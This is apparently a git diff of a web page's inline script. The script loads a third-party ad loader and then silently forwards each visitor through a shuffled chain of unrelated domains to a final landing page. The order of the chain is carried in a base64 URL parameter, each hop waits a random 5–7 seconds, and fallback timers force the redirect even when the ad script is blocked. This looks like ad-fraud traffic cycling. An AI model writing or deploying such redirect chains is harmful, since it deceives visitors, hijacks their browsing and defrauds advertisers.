@@ -10,13 +10,17 @@ src="https://sads.adsboosters.xyz/ffc8b614d688665892a7071a2a3dc5f2.js"
 data-cfasync="false"></script>
 
 <script>
-// List of rotating domains
-const domains = [
+// ALL POSSIBLE DOMAINS
+let domains = [
     "https://glimmerbyte.com/",
     "https://healthyhumansource.com/",
     "https://eduprothink.com/",
     "https://linkcents.com/"
 ];
+
+// ❌ Remove current domain from loop
+let current = window.location.origin + "/";
+domains = domains.filter(d => d !== current);
 
 // Shuffle function
 function shuffle(array) {
@@ -27,22 +31,30 @@ function shuffle(array) {
     return array;
 }
 
-// Get params
+// Read params
 let params = new URLSearchParams(window.location.search);
 let orderParam = params.get("order");
 let index = parseInt(params.get("index")) || 0;
 
-let order = orderParam ? atob(orderParam).split(",") : shuffle([...domains]);
+let order;
 
-// Final landing page
+// If first time → shuffle remaining domains (except current)
+if (!orderParam) {
+    order = shuffle([...domains]);
+    index = 0;
+} else {
+    order = atob(orderParam).split(",");
+}
+
+// FINAL landing page
 const finalUrl = "https://testss-3c9.pages.dev/";
 
-// Delay: 5–7 seconds
+// Delay (5–7 sec)
 function delay() {
     return 5000 + Math.floor(Math.random() * 2000);
 }
 
-// Actual redirect logic
+// Redirect logic
 function doRedirect() {
     if (window.redirected) return;
     window.redirected = true;
@@ -50,8 +62,8 @@ function doRedirect() {
     setTimeout(() => {
         if (index < order.length - 1) {
             index++;
-            const newOrder = btoa(order.join(","));
-            const nextUrl = order[index] + "?order=" + newOrder + "&index=" + index;
+            let encoded = btoa(order.join(","));
+            let nextUrl = order[index] + "?order=" + encoded + "&index=" + index;
             window.location.href = nextUrl;
         } else {
             window.location.href = finalUrl;
@@ -59,21 +71,19 @@ function doRedirect() {
     }, delay());
 }
 
-// Detect AD SCRIPT status
+// Detect AD SCRIPT
 const adScript = document.getElementById("AdsCoreLoader");
-
-// If load event triggers → redirect
 if (adScript) {
     adScript.onload = () => doRedirect();
     adScript.onerror = () => doRedirect();
 }
 
-// Fallback 1 → If ad script never fires (common case)
+// Fallback 1 (if script blocked)
 setTimeout(() => {
     if (!window.redirected) doRedirect();
 }, 4000);
 
-// Fallback 2 → If DOM loads before ad script fires
+// Fallback 2 (DOM loaded)
 document.addEventListener("DOMContentLoaded", () => {
     setTimeout(() => {
         if (!window.redirected) doRedirect();
